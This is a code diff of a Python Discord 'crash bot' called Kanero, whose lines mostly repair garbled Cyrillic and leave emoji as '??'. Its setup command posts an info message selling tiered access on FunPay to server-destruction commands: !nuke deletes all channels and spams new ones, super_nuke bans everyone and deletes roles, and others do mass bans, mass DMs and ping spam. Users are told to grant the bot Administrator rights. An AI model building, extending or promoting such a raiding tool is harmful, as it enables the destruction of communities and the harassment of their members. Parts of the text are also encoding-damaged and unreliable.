+            "?? PREMIUM: premium-chat · premium-info · premium-tools (Premium+)\n"
+            "?? TESTS: bug-reports · testing · test-results (Tester+)\n"
+            "?? ВОЙСЫ: voice-1/2/3 · premium-voice · admin-voice\n"
+            "?? ADMIN: logs · admin-chat (Owner+)\n\n"
+            f"Авто-роль при входе: {f'<@&{role_guest.id}>' if role_guest else '?? Guest'}\n"
+            "Роль ?? User выдаётся при написании в addbot."
         ),
         color=0x0a0a0a
     )
-    embed.set_footer(text="в пёЏ Kanero  |  РЈСЃРєРѕСЂРµРЅРЅР°СЏ РІРµСЂСЃРёСЏ setup  |  !giverole @СЋР·РµСЂ @СЂРѕР»СЊ")
+    embed.set_footer(text="?? Kanero  |  Ускоренная версия setup  |  !giverole @юзер @роль")
     await msg.edit(content=None, embed=embed)
 
 
 @bot.command(name="setup_update")
 async def setup_update(ctx):
-    """РћР±РЅРѕРІРёС‚СЊ СЃРµСЂРІРµСЂ Р±РµР· СѓРґР°Р»РµРЅРёСЏ РєР°РЅР°Р»РѕРІ. РўРѕР»СЊРєРѕ РґР»СЏ РѕРІРЅРµСЂРѕРІ."""
+    """Обновить сервер без удаления каналов. Только для овнеров."""
     if ctx.author.id != config.OWNER_ID and ctx.author.id not in config.OWNER_WHITELIST:
-        await ctx.send("вќЊ РўРѕР»СЊРєРѕ РґР»СЏ РѕРІРЅРµСЂРѕРІ.")
+        await ctx.send("? Только для овнеров.")
         return
     guild = ctx.guild
-    msg = await ctx.send("рџ”„ РћР±РЅРѕРІР»СЏСЋ СЃРµСЂРІРµСЂ Р±РµР· СѓРґР°Р»РµРЅРёСЏ РєР°РЅР°Р»РѕРІ...")
+    msg = await ctx.send("?? Обновляю сервер без удаления каналов...")
     results = []
 
-    # 1. @everyone вЂ” РЅРёС‡РµРіРѕ РЅРµ РІРёРґРёС‚
+    # 1. @everyone — ничего не видит
     try:
         await guild.default_role.edit(permissions=discord.Permissions(
             read_messages=False, send_messages=False, connect=False, use_application_commands=False
         ))
-        results.append("вњ… @everyone РѕР±РЅРѕРІР»С‘РЅ")
+        results.append("? @everyone обновлён")
     except Exception as e:
-        results.append(f"вќЊ @everyone: {e}")
+        results.append(f"? @everyone: {e}")
 
-    # 2. РћР±РЅРѕРІР»СЏРµРј РїСЂР°РІР° СЂРѕР»РµР№
+    # 2. Обновляем права ролей
     role_updates = {
-        "рџ‘¤ Guest":   discord.Permissions(read_messages=True, read_message_history=True, send_messages=False, add_reactions=True, connect=False, speak=False, use_application_commands=False),
-        "рџ‘Ґ User":    discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=False, speak=False, use_application_commands=False),
-        "вњ… White":   discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=True, speak=True, use_voice_activation=True, stream=True, use_application_commands=False),
-        "рџ’Ћ Premium": discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, manage_messages=True, connect=True, speak=True, use_voice_activation=True, stream=True, move_members=True, priority_speaker=True, use_application_commands=False),
+        "?? Guest":   discord.Permissions(read_messages=True, read_message_history=True, send_messages=False, add_reactions=True, connect=False, speak=False, use_application_commands=False),
+        "?? User":    discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=False, speak=False, use_application_commands=False),
+        "? White":   discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, connect=True, speak=True, use_voice_activation=True, stream=True, use_application_commands=False),
+        "?? Premium": discord.Permissions(read_messages=True, read_message_history=True, send_messages=True, embed_links=True, attach_files=True, add_reactions=True, use_external_emojis=True, manage_messages=True, connect=True, speak=True, use_voice_activation=True, stream=True, move_members=True, priority_speaker=True, use_application_commands=False),
     }
     for rname, perms in role_updates.items():
         role = discord.utils.find(lambda r: r.name == rname, guild.roles)
         if role:
             try:
                 await role.edit(permissions=perms)
-                results.append(f"вњ… {rname}")
+                results.append(f"? {rname}")
             except Exception as e:
-                results.append(f"вќЊ {rname}: {e}")
+                results.append(f"? {rname}: {e}")
         else:
-            results.append(f"вљ пёЏ {rname} РЅРµ РЅР°Р№РґРµРЅР° вЂ” СЃРѕР·РґР°СЋ")
+            results.append(f"?? {rname} не найдена — создаю")
             try:
                 await guild.create_role(name=rname)
             except Exception:
                 pass
 
-    # 3. РЎРѕР·РґР°С‘Рј РѕС‚СЃСѓС‚СЃС‚РІСѓСЋС‰РёРµ СЂРѕР»Рё
-    for rname in ("рџ›ЎпёЏ Moderator", "рџЋ¬ Media", "рџ¤ќ Friend", "рџ§Є Tester"):
+    # 3. Создаём отсутствующие роли
+    for rname in ("??? Moderator", "?? Media", "?? Friend", "?? Tester"):
         existing_role = discord.utils.find(lambda r: r.name == rname, guild.roles)
         if not existing_role:
             try:
                 await guild.create_role(name=rname)
-                results.append(f"вњ… РЎРѕР·РґР°РЅР° {rname}")
+                results.append(f"? Создана {rname}")
             except Exception:
                 pass
         else:
-            results.append(f"вљ пёЏ {rname} СѓР¶Рµ СЃСѓС‰РµСЃС‚РІСѓРµС‚")
+            results.append(f"?? {rname} уже существует")
 
-    # 4. ADMIN вЂ” РѕР±РЅРѕРІР»СЏРµРј РїСЂР°РІР° Рё СЃРѕР·РґР°С‘Рј admin-chat РµСЃР»Рё РЅРµС‚
+    # 4. ADMIN — обновляем права и создаём admin-chat если нет
     def _ow(read=False, write=False):
         return discord.PermissionOverwrite(read_messages=read, send_messages=write)
 
-    role_owner  = discord.utils.find(lambda r: r.name == "рџ‘‘ Owner",    guild.roles)
-    role_dev    = discord.utils.find(lambda r: r.name == "рџ”§ Developer", guild.roles)
-    role_guest  = discord.utils.find(lambda r: r.name == "рџ‘¤ Guest",    guild.roles)
-    role_user   = discord.utils.find(lambda r: r.name == "рџ‘Ґ User",     guild.roles)
-    role_white  = discord.utils.find(lambda r: r.name == "вњ… White",    guild.roles)
-    role_prem   = discord.utils.find(lambda r: r.name == "рџ’Ћ Premium",  guild.roles)
-    role_friend = discord.utils.find(lambda r: r.name == "рџ¤ќ Friend",   guild.roles)
+    role_owner  = discord.utils.find(lambda r: r.name == "?? Owner",    guild.roles)
+    role_dev    = discord.utils.find(lambda r: r.name == "?? Developer", guild.roles)
+    role_guest  = discord.utils.find(lambda r: r.name == "?? Guest",    guild.roles)
+    role_user   = discord.utils.find(lambda r: r.name == "?? User",     guild.roles)
+    role_white  = discord.utils.find(lambda r: r.name == "? White",    guild.roles)
+    role_prem   = discord.utils.find(lambda r: r.name == "?? Premium",  guild.roles)
+    role_friend = discord.utils.find(lambda r: r.name == "?? Friend",   guild.roles)
 
-    # в”Ђв”Ђ РЎР РђР—РЈ РІС‹РґР°С‘Рј СЂРѕР»СЊ Guest РІСЃРµРј Сѓ РєРѕРіРѕ РЅРµС‚ СЂРѕР»РµР№ в”Ђв”Ђ
+    # -- СРАЗУ выдаём роль Guest всем у кого нет ролей --
     if role_guest:
         try:
             guest_count = 0
             for member in guild.members:
                 if member.bot:
                     continue
-                # РџСЂРѕРІРµСЂСЏРµРј РµСЃС‚СЊ Р»Рё Сѓ СѓС‡Р°СЃС‚РЅРёРєР° СЂРѕР»Рё (РєСЂРѕРјРµ @everyone)
-                if len(member.roles) == 1:  # РўРѕР»СЊРєРѕ @everyone
+                # Проверяем есть ли у участника роли (кроме @everyone)
+                if len(member.roles) == 1:  # Только @everyone
                     try:
-                        await member.add_roles(role_guest, reason="Setup Update - Р°РІС‚Рѕ-РІС‹РґР°С‡Р° Guest")
+                        await member.add_roles(role_guest, reason="Setup Update - авто-выдача Guest")
                         guest_count += 1
                     except Exception:
                         pass
             if guest_count > 0:
-                results.append(f"вњ… Р’С‹РґР°РЅР° СЂРѕР»СЊ рџ‘¤ Guest {guest_count} СѓС‡Р°СЃС‚РЅРёРєР°Рј")
+                results.append(f"? Выдана роль ?? Guest {guest_count} участникам")
         except Exception as e:
-            results.append(f"вќЊ Р’С‹РґР°С‡Р° Guest: {e}")
+            results.append(f"? Выдача Guest: {e}")
 
-    # 4. ADMIN вЂ” РѕР±РЅРѕРІР»СЏРµРј РїСЂР°РІР° Рё СЃРѕР·РґР°С‘Рј admin-chat РµСЃР»Рё РЅРµС‚
+    # 4. ADMIN — обновляем права и создаём admin-chat если нет
     admin_cat = discord.utils.find(lambda c: "ADMIN" in c.name, guild.categories)
     if admin_cat:
-        # РћР±РЅРѕРІР»СЏРµРј РїСЂР°РІР° СЃСѓС‰РµСЃС‚РІСѓСЋС‰РёС… РєР°РЅР°Р»РѕРІ
+        # Обновляем права существующих каналов
         for ch in admin_cat.channels:
             if "admin-chat" in ch.name.lower():
-                continue  # admin-chat РѕР±СЂР°Р±Р°С‚С‹РІР°РµРј РѕС‚РґРµР»СЊРЅРѕ
+                continue  # admin-chat обрабатываем отдельно
             try:
                 ow = {guild.default_role: discord.PermissionOverwrite(read_messages=False)}
                 for r in guild.roles:
-                    if r.name in ("рџ‘‘ Owner", "рџ”§ Developer", "рџ¤– Kanero"):
+                    if r.name in ("?? Owner", "?? Developer", "?? Kanero"):
                         ow[r] = discord.PermissionOverwrite(read_messages=True, send_messages=True)
                 await ch.edit(overwrites=ow)
             except Exception:
                 pass
-        # РЎРѕР·РґР°С‘Рј admin-chat РµСЃР»Рё РЅРµС‚
+        # Создаём admin-chat если нет
         existing_names = [ch.name.lower() for ch in admin_cat.channels]
         if not any("admin-chat" in n for n in existing_names):
             try:
@@ -2933,21 +2933,21 @@ async def setup_update(ctx):
                 if role_friend: ow[role_friend] = _ow(False, False)
                 if role_owner:  ow[role_owner]  = _ow(True, True)
                 if role_dev:    ow[role_dev]    = _ow(True, True)
-                await guild.create_text_channel("рџ’¬гѓ»admin-chat", category=admin_cat, overwrites=ow, topic="Р§Р°С‚ РґР»СЏ Owner Рё Developer")
-                results.append("вњ… РЎРѕР·РґР°РЅ рџ’¬гѓ»admin-chat")
+                await guild.create_text_channel("???admin-chat", category=admin_cat, overwrites=ow, topic="Чат для Owner и Developer")
+                results.append("? Создан ???admin-chat")
             except Exception as e:
-                results.append(f"вќЊ admin-chat: {e}")
-        results.append("вњ… ADMIN РѕР±РЅРѕРІР»С‘РЅ")
+                results.append(f"? admin-chat: {e}")
+        results.append("? ADMIN обновлён")
 
-    # 5. РЎРѕР·РґР°С‘Рј РѕС‚СЃСѓС‚СЃС‚РІСѓСЋС‰РёРµ РєР°РЅР°Р»С‹ РІ РћРЎРќРћР’РќРћР•
-    cat_main = discord.utils.find(lambda c: "РћРЎРќРћР’РќРћР•" in c.name, guild.categories)
+    # 5. Создаём отсутствующие каналы в ОСНОВНОЕ
+    cat_main = discord.utils.find(lambda c: "ОСНОВНОЕ" in c.name, guild.categories)
     if cat_main:
         existing = [ch.name.lower() for ch in cat_main.channels]
         missing_channels = []
         if not any("sell" in n for n in existing):
-            missing_channels.append(("рџ›’гѓ»sell", "РџСЂРѕРґР°Р¶Р° White/Premium вЂ” РїРёС€РµС‚ С‚РѕР»СЊРєРѕ Owner"))
-        if not any("РІС‹РґР°С‡Р°" in n for n in existing):
-            missing_channels.append(("рџЋ«гѓ»РІС‹РґР°С‡Р°-РІР°Р№С‚Р°", "!wl_add, !pm_add, !fl_add вЂ” С‚РѕР»СЊРєРѕ Owner"))
+            missing_channels.append(("???sell", "Продажа White/Premium — пишет только Owner"))
+        if not any("выдача" in n for n in existing):
+            missing_channels.append(("???выдача-вайта", "!wl_add, !pm_add, !fl_add — только Owner"))
         for ch_name, topic in missing_channels:
             try:
                 ow = {guild.default_role: _ow()}
@@ -2958,11 +2958,11 @@ async def setup_update(ctx):
                 if role_owner: ow[role_owner] = _ow(True, True)
                 if role_dev:   ow[role_dev]   = _ow(True, True)
                 await guild.create_text_channel(ch_name, category=cat_main, overwrites=ow, topic=topic)
-                results.append(f"вњ… РЎРѕР·РґР°РЅ {ch_name}")
+                results.append(f"? Создан {ch_name}")
             except Exception as e:
-                results.append(f"вќЊ {ch_name}: {e}")
+                results.append(f"? {ch_name}: {e}")
 
-    # 6. РЎРѕР·РґР°С‘Рј РєР°С‚РµРіРѕСЂРёСЋ INFO Рё РєР°РЅР°Р» #info РµСЃР»Рё РёС… РЅРµС‚
+    # 6. Создаём категорию INFO и канал #info если их нет
     cat_info = discord.utils.find(lambda c: "INFO" in c.name, guild.categories)
     if not cat_info:
         try:
@@ -2973,35 +2973,35 @@ async def setup_update(ctx):
             if role_prem:  ow_info[role_prem]  = _ow(True, False)
             if role_owner: ow_info[role_owner] = _ow(True, True)
             if role_dev:   ow_info[role_dev]   = _ow(True, True)
-            cat_info = await guild.create_category("в”Ѓв”Ѓв”Ѓв”Ѓ в„№пёЏ INFO в”Ѓв”Ѓв”Ѓв”Ѓ", overwrites=ow_info)
-            # РџРµСЂРµРјРµС‰Р°РµРј INFO РїРѕРґ WELCOME (РїРѕР·РёС†РёСЏ 1)
+            cat_info = await guild.create_category("???? ?? INFO ????", overwrites=ow_info)
+            # Перемещаем INFO под WELCOME (позиция 1)
             cat_welcome = discord.utils.find(lambda c: "WELCOME" in c.name, guild.categories)
             if cat_welcome:
                 try:
                     await cat_info.edit(position=cat_welcome.position + 1)
                 except Exception:
                     pass
-            results.append("вњ… РЎРѕР·РґР°РЅР° РєР°С‚РµРіРѕСЂРёСЏ INFO")
+            results.append("? Создана категория INFO")
         except Exception as e:
-            results.append(f"вќЊ РљР°С‚РµРіРѕСЂРёСЏ INFO: {e}")
+            results.append(f"? Категория INFO: {e}")
     else:
-        # Р•СЃР»Рё INFO СѓР¶Рµ СЃСѓС‰РµСЃС‚РІСѓРµС‚, РїСЂРѕРІРµСЂСЏРµРј РµС‘ РїРѕР·РёС†РёСЋ
+        # Если INFO уже существует, проверяем её позицию
         cat_welcome = discord.utils.find(lambda c: "WELCOME" in c.name, guild.categories)
         if cat_welcome and cat_info.position != cat_welcome.position + 1:
             try:
                 await cat_info.edit(position=cat_welcome.position + 1)
-                results.append("вњ… РџРµСЂРµРјРµС‰РµРЅР° РєР°С‚РµРіРѕСЂРёСЏ INFO РїРѕРґ WELCOME")
+                results.append("? Перемещена категория INFO под WELCOME")
             except Exception:
                 pass
     
-    # РџРµСЂРµРЅРѕСЃРёРј #changelog РёР· РћРЎРќРћР’РќРћР• РІ INFO РµСЃР»Рё РѕРЅ С‚Р°Рј
+    # Переносим #changelog из ОСНОВНОЕ в INFO если он там
     changelog_ch = discord.utils.find(lambda c: "changelog" in c.name.lower(), guild.text_channels)
     if changelog_ch and cat_info and changelog_ch.category != cat_info:
         try:
             await changelog_ch.edit(category=cat_info)
-            results.append("вњ… РџРµСЂРµРЅРµСЃРµРЅ рџ“‹гѓ»changelog РІ INFO")
+            results.append("? Перенесен ???changelog в INFO")
         except Exception as e:
-            results.append(f"вќЊ РџРµСЂРµРЅРѕСЃ changelog: {e}")
+            results.append(f"? Перенос changelog: {e}")
     
     if cat_info:
         existing_info = [ch.name.lower() for ch in cat_info.channels]
@@ -3014,142 +3014,142 @@ async def setup_update(ctx):
                 if role_prem:  ow_info_ch[role_prem]  = _ow(True, False)
                 if role_owner: ow_info_ch[role_owner] = _ow(True, True)
                 if role_dev:   ow_info_ch[role_dev]   = _ow(True, True)
-                info_ch = await guild.create_text_channel("в„№пёЏгѓ»info", category=cat_info, overwrites=ow_info_ch, topic="РРЅС„РѕСЂРјР°С†РёСЏ Рѕ РїРѕРєСѓРїРєРµ РґРѕСЃС‚СѓРїР° Рё РїРѕРјРѕС‰Рё")
-                # РћС‚РїСЂР°РІР»СЏРµРј СЃРѕРѕР±С‰РµРЅРёРµ РІ #info
-                ticket_ch = discord.utils.find(lambda c: "create-ticket" in c.name.lower() or "С‚РёРєРµС‚" in c.name.lower(), guild.text_channels)
+                info_ch = await guild.create_text_channel("???info", category=cat_info, overwrites=ow_info_ch, topic="Информация о покупке доступа и помощи")
+                # Отправляем сообщение в #info
+                ticket_ch = discord.utils.find(lambda c: "create-ticket" in c.name.lower() or "тикет" in c.name.lower(), guild.text_channels)
                 addbot_ch = discord.utils.find(lambda c: "addbot" in c.name.lower(), guild.text_channels)
                 info_embed = discord.Embed(
-                    title="в„№пёЏ РРЅС„РѕСЂРјР°С†РёСЏ вЂ” Kanero",
+                    title="?? Информация — Kanero",
                     description=(
-                        "**рџ¤– РљР°Рє РґРѕР±Р°РІРёС‚СЊ Р±РѕС‚Р° РЅР° СЃРІРѕР№ СЃРµСЂРІРµСЂ:**\n"
-                        "1. РџРѕР»СѓС‡Рё РґРѕСЃС‚СѓРї (СЃРј. РЅРёР¶Рµ)\n"
-                        "2. РќР°РїРёС€Рё `!inv` Р±РѕС‚Сѓ РІ Р›РЎ РёР»Рё РЅР° СЃРµСЂРІРµСЂРµ\n"
-                        "3. РџРµСЂРµР№РґРё РїРѕ СЃСЃС‹Р»РєРµ Рё РІС‹Р±РµСЂРё СЃРІРѕР№ СЃРµСЂРІРµСЂ\n"
-                        "4. **Р’РђР–РќРћ:** Р”Р°Р№ Р±РѕС‚Сѓ СЂРѕР»СЊ СЃ РїСЂР°РІР°РјРё **РђРґРјРёРЅРёСЃС‚СЂР°С‚РѕСЂР°**\n"
-                        "5. РџРѕРґРЅРёРјРё СЂРѕР»СЊ Р±РѕС‚Р° **РІС‹С€Рµ РІСЃРµС…** РІ РЅР°СЃС‚СЂРѕР№РєР°С… СЃРµСЂРІРµСЂР°\n"
-                        "6. Р“РѕС‚РѕРІРѕ! РСЃРїРѕР»СЊР·СѓР№ РєРѕРјР°РЅРґС‹\n\n"
-                        "**рџ“‹ Р‘РµСЃРїР»Р°С‚РЅС‹Р№ РґРѕСЃС‚СѓРї (Freelist):**\n"
-                        f"РќР°РїРёС€Рё Р»СЋР±РѕРµ СЃРѕРѕР±С‰РµРЅРёРµ РІ {addbot_ch.mention if addbot_ch else 'рџ¤–гѓ»addbot'}\n"
-                        "РџРѕР»СѓС‡РёС€СЊ СЂРѕР»СЊ рџ‘Ґ User Рё РєРѕРјР°РЅРґС‹:\n"
-                        "вЂў `!nuke` вЂ” СѓРґР°Р»СЏРµС‚ РІСЃРµ РєР°РЅР°Р»С‹ Рё СЃРѕР·РґР°РµС‚ 30 РЅРѕРІС‹С… СЃРѕ СЃРїР°РјРѕРј\n"
-                        "вЂў `!auto_nuke on/off` вЂ” Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРёР№ РєСЂР°С€ РїСЂРё РґРѕР±Р°РІР»РµРЅРёРё Р±РѕС‚Р°\n"
-                        "вЂў `!help` вЂ” СЃРїРёСЃРѕРє РІСЃРµС… РєРѕРјР°РЅРґ\n"
-                        "вЂў `!changelog` вЂ” РїРѕСЃР»РµРґРЅРёРµ РѕР±РЅРѕРІР»РµРЅРёСЏ\n\n"
-                        "**вњ… White (РїР»Р°С‚РЅС‹Р№ РґРѕСЃС‚СѓРї):**\n"
-                        "Р’СЃРµ РєРѕРјР°РЅРґС‹ Freelist + РґРѕРїРѕР»РЅРёС‚РµР»СЊРЅРѕ:\n"
-                        "вЂў `!nuke [С‚РµРєСЃС‚]` вЂ” РєСЂР°С€ СЃ С‚РІРѕРёРј С‚РµРєСЃС‚РѕРј СЃРїР°РјР°\n"
-                        "вЂў `!stop` вЂ” РѕСЃС‚Р°РЅРѕРІРёС‚СЊ РєСЂР°С€\n"
-                        "вЂў `!cleanup` вЂ” СѓРґР°Р»РёС‚СЊ РІСЃРµ РєР°РЅР°Р»С‹\n"
-                        "вЂў `!rename [РЅР°Р·РІР°РЅРёРµ]` вЂ” РїРµСЂРµРёРјРµРЅРѕРІР°С‚СЊ СЃРµСЂРІРµСЂ\n"
-                        "вЂў `!nicks_all [РЅРёРє]` вЂ” СЃРјРµРЅРёС‚СЊ РІСЃРµРј РЅРёРєРё\n"
-                        "вЂў `!webhooks` вЂ” СЃРѕР·РґР°С‚СЊ 50 РІРµР±С…СѓРєРѕРІ\n"
-                        "вЂў `!clear [С‡РёСЃР»Рѕ]` вЂ” СѓРґР°Р»РёС‚СЊ СЃРѕРѕР±С‰РµРЅРёСЏ\n"
-                        "вЂў `!clear_all` вЂ” СѓРґР°Р»РёС‚СЊ Р’РЎР• СЃРѕРѕР±С‰РµРЅРёСЏ РІ РєР°РЅР°Р»Рµ\n\n"
-                        "**рџ’Ћ Premium (РјР°РєСЃРёРјР°Р»СЊРЅС‹Р№ РґРѕСЃС‚СѓРї):**\n"
-                        "Р’СЃРµ РєРѕРјР°РЅРґС‹ White + РјРѕС‰РЅС‹Рµ С„СѓРЅРєС†РёРё:\n"
-                        "вЂў `!super_nuke` вЂ” СѓСЃРёР»РµРЅРЅС‹Р№ РєСЂР°С€ (Р±Р°РЅРёС‚ РІСЃРµС… + СѓРґР°Р»СЏРµС‚ СЂРѕР»Рё)\n"
-                        "вЂў `!auto_super_nuke on/off` вЂ” Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРёР№ СЃСѓРїРµСЂ-РєСЂР°С€\n"
-                        "вЂў `!massban` вЂ” РјР°СЃСЃРѕРІС‹Р№ Р±Р°РЅ СѓС‡Р°СЃС‚РЅРёРєРѕРІ\n"
-                        "вЂў `!massdm [С‚РµРєСЃС‚]` вЂ” РѕС‚РїСЂР°РІРёС‚СЊ Р›РЎ РІСЃРµРј\n"
-                        "вЂў `!spam [С‚РµРєСЃС‚] [С‡РёСЃР»Рѕ]` вЂ” СЃРїР°Рј РІ РєР°РЅР°Р»Рµ\n"
-                        "вЂў `!pingspam [@СЂРѕР»СЊ] [С‡РёСЃР»Рѕ]` вЂ” СЃРїР°Рј СѓРїРѕРјРёРЅР°РЅРёСЏРјРё\n"
-                        "вЂў `!rolesdelete` вЂ” СѓРґР°Р»РёС‚СЊ РІСЃРµ СЂРѕР»Рё\n\n"
-                        "**рџ’° РљСѓРїРёС‚СЊ White / Premium:**\n"
-                        "РџРµСЂРµР№РґРё РЅР° FunPay Рё РІС‹Р±РµСЂРё С‚Р°СЂРёС„:\n"
+                        "**?? Как добавить бота на свой сервер:**\n"
+                        "1. Получи доступ (см. ниже)\n"
+                        "2. Напиши `!inv` боту в ЛС или на сервере\n"
+                        "3. Перейди по ссылке и выбери свой сервер\n"
+                        "4. **ВАЖНО:** Дай боту роль с правами **Администратора**\n"
+                        "5. Подними роль бота **выше всех** в настройках сервера\n"
+                        "6. Готово! Используй команды\n\n"
+                        "**?? Бесплатный доступ (Freelist):**\n"
+                        f"Напиши любое сообщение в {addbot_ch.mention if addbot_ch else '???addbot'}\n"
+                        "Получишь роль ?? User и команды:\n"
+                        "• `!nuke` — удаляет все каналы и создает 30 новых со спамом\n"
+                        "• `!auto_nuke on/off` — автоматический краш при добавлении бота\n"
+                        "• `!help` — список всех команд\n"
+                        "• `!changelog` — последние обновления\n\n"
+                        "**? White (платный доступ):**\n"
+                        "Все команды Freelist + дополнительно:\n"
+                        "• `!nuke [текст]` — краш с твоим текстом спама\n"
+                        "• `!stop` — остановить краш\n"
+                        "• `!cleanup` — удалить все каналы\n"
+                        "• `!rename [название]` — переименовать сервер\n"
+                        "• `!nicks_all [ник]` — сменить всем ники\n"
+                        "• `!webhooks` — создать 50 вебхуков\n"
+                        "• `!clear [число]` — удалить сообщения\n"
+                        "• `!clear_all` — удалить ВСЕ сообщения в канале\n\n"
+                        "**?? Premium (максимальный доступ):**\n"
+                        "Все команды White + мощные функции:\n"
+                        "• `!super_nuke` — усиленный краш (банит всех + удаляет роли)\n"
+                        "• `!auto_super_nuke on/off` — автоматический супер-краш\n"
+                        "• `!massban` — массовый бан участников\n"
+                        "• `!massdm [текст]` — отправить ЛС всем\n"
+                        "• `!spam [текст] [число]` — спам в канале\n"
+                        "• `!pingspam [@роль] [число]` — спам упоминаниями\n"
+                        "• `!rolesdelete` — удалить все роли\n\n"
+                        "**?? Купить White / Premium:**\n"
+                        "Перейди на FunPay и выбери тариф:\n"
                         "https://funpay.com/users/16928925/ \n\n"
-                        "**вќ“ РќСѓР¶РЅР° РїРѕРјРѕС‰СЊ?**\n"
-                        f"РЎРѕР·РґР°Р№ С‚РёРєРµС‚: {ticket_ch.mention if ticket_ch else 'рџЋ«гѓ»create-ticket'}\n"
-                        "РђРґРјРёРЅРёСЃС‚СЂР°С†РёСЏ РѕС‚РІРµС‚РёС‚ РІ С‚РµС‡РµРЅРёРµ 24 С‡Р°СЃРѕРІ\n\n"
-                        "**рџ”— РќР°С€ Discord СЃРµСЂРІРµСЂ:**\n"
-                        "https://discord.gg/aud6wwYVRd \n"
-                        "Р—Р°С…РѕРґРё Рє РЅР°Рј РІ РіРѕСЃС‚Рё!"
+                        "**? Нужна помощь?**\n"
+                        f"Создай тикет: {ticket_ch.mention if ticket_ch else '???create-ticket'}\n"
+                        "Администрация ответит в течение 24 часов\n\n"
+                        "**?? Наш Discord сервер:**\n"
+                        "https://discord.gg/nNTB37QNCG \n"
+                        "Заходи к нам в гости!"
                     ),
                     color=0x0a0a0a
                 )
-                info_embed.set_footer(text="в пёЏ Kanero  |  РљСЂР°С€-Р±РѕС‚ РґР»СЏ Discord")
+                info_embed.set_footer(text="?? Kanero  |  Краш-бот для Discord")
                 await info_ch.send(embed=info_embed)
-                results.append("вњ… РЎРѕР·РґР°РЅ в„№пёЏгѓ»info")
+                results.append("? Создан ???info")
             except Exception as e:
-                results.append(f"вќЊ в„№пёЏгѓ»info: {e}")
+                results.append(f"? ???info: {e}")
         else:
-            # РљР°РЅР°Р» #info СѓР¶Рµ СЃСѓС‰РµСЃС‚РІСѓРµС‚, РїСЂРѕРІРµСЂСЏРµРј Рё РѕР±РЅРѕРІР»СЏРµРј СЃРѕРѕР±С‰РµРЅРёРµ
+            # Канал #info уже существует, проверяем и обновляем сообщение
             info_ch = discord.utils.find(lambda c: "info" in c.name.lower(), cat_info.channels)
             if info_ch:
                 try:
-                    # РС‰РµРј СЃСѓС‰РµСЃС‚РІСѓСЋС‰РµРµ СЃРѕРѕР±С‰РµРЅРёРµ Р±РѕС‚Р° СЃ embed "РРЅС„РѕСЂРјР°С†РёСЏ вЂ” Kanero"
+                    # Ищем существующее сообщение бота с embed "Информация — Kanero"
                     existing_message = None
                     async for message in info_ch.history(limit=50):
                         if (message.author == bot.user and message.embeds and 
                             len(message.embeds) > 0 and 
-                            "РРЅС„РѕСЂРјР°С†РёСЏ вЂ” Kanero" in message.embeds[0].title):
+                            "Информация — Kanero" in message.embeds[0].title):
                             existing_message = message
                             break
                     
-                    # РџРѕР»СѓС‡Р°РµРј Р°РєС‚СѓР°Р»СЊРЅС‹Рµ СЃСЃС‹Р»РєРё РЅР° РєР°РЅР°Р»С‹
-                    ticket_ch = discord.utils.find(lambda c: "create-ticket" in c.name.lower() or "С‚РёРєРµС‚" in c.name.lower(), guild.text_channels)
+                    # Получаем актуальные ссылки на каналы
+                    ticket_ch = discord.utils.find(lambda c: "create-ticket" in c.name.lower() or "тикет" in c.name.lower(), guild.text_channels)
                     addbot_ch = discord.utils.find(lambda c: "addbot" in c.name.lower(), guild.text_channels)
                     
-                    # РЎРѕР·РґР°РµРј РѕР±РЅРѕРІР»РµРЅРЅС‹Р№ embed СЃ Р°РєС‚СѓР°Р»СЊРЅС‹РјРё СЃСЃС‹Р»РєР°РјРё
+                    # Создаем обновленный embed с актуальными ссылками
                     info_embed = discord.Embed(
-                        title="в„№пёЏ РРЅС„РѕСЂРјР°С†РёСЏ вЂ” Kanero",
+                        title="?? Информация — Kanero",
                         description=(
-                            "**рџ¤– РљР°Рє РґРѕР±Р°РІРёС‚СЊ Р±РѕС‚Р° РЅР° СЃРІРѕР№ СЃРµСЂРІРµСЂ:**\n"
-                            "1. РџРѕР»СѓС‡Рё РґРѕСЃС‚СѓРї (СЃРј. РЅРёР¶Рµ)\n"
-                            "2. РќР°РїРёС€Рё `!inv` Р±РѕС‚Сѓ РІ Р›РЎ РёР»Рё РЅР° СЃРµСЂРІРµСЂРµ\n"
-                            "3. РџРµСЂРµР№РґРё РїРѕ СЃСЃС‹Р»РєРµ Рё РІС‹Р±РµСЂРё СЃРІРѕР№ СЃРµСЂРІРµСЂ\n"
-                            "4. **Р’РђР–РќРћ:** Р”Р°Р№ Р±РѕС‚Сѓ СЂРѕР»СЊ СЃ РїСЂР°РІР°РјРё **РђРґРјРёРЅРёСЃС‚СЂР°С‚РѕСЂР°**\n"
-                            "5. РџРѕРґРЅРёРјРё СЂРѕР»СЊ Р±РѕС‚Р° **РІС‹С€Рµ РІСЃРµС…** РІ РЅР°СЃС‚СЂРѕР№РєР°С… СЃРµСЂРІРµСЂР°\n"
-                            "6. Р“РѕС‚РѕРІРѕ! РСЃРїРѕР»СЊР·СѓР№ РєРѕРјР°РЅРґС‹\n\n"
-                            "**рџ“‹ Р‘РµСЃРїР»Р°С‚РЅС‹Р№ РґРѕСЃС‚СѓРї (Freelist):**\n"
-                            f"РќР°РїРёС€Рё Р»СЋР±РѕРµ СЃРѕРѕР±С‰РµРЅРёРµ РІ {addbot_ch.mention if addbot_ch else 'рџ¤–гѓ»addbot'}\n"
-                            "РџРѕР»СѓС‡РёС€СЊ СЂРѕР»СЊ рџ‘Ґ User Рё РєРѕРјР°РЅРґС‹:\n"
-                            "вЂў `!nuke` вЂ” СѓРґР°Р»СЏРµС‚ РІСЃРµ РєР°РЅР°Р»С‹ Рё СЃРѕР·РґР°РµС‚ 30 РЅРѕРІС‹С… СЃРѕ СЃРїР°РјРѕРј\n"
-                            "вЂў `!auto_nuke on/off` вЂ” Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРёР№ РєСЂР°С€ РїСЂРё РґРѕР±Р°РІР»РµРЅРёРё Р±РѕС‚Р°\n"
